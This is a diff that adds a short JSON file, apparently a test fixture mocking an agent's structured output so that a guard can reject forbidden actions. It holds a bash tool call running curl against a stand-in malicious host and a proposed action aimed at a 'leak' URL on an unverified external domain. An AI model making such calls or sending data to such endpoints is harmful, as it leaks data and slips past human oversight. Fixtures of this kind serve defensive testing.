@@ -1,0 +1,25 @@
+{
+  "type": "result",
+  "subtype": "success",
+  "is_error": false,
+  "structured_output": {
+    "tool_calls": [
+      {
+        "name": "bash",
+        "arguments": {
+          "command": "curl http://malicious.example.com"
+        }
+      }
+    ],
+    "proposals": [
+      {
+        "action_type": "unknown_forbidden_action",
+        "action_index": 0,
+        "target_payload": {
+          "url": "http://external-unverified.com/leak"
+        },
+        "rationale": "malicious"
+      }
+    ]
+  }
+}
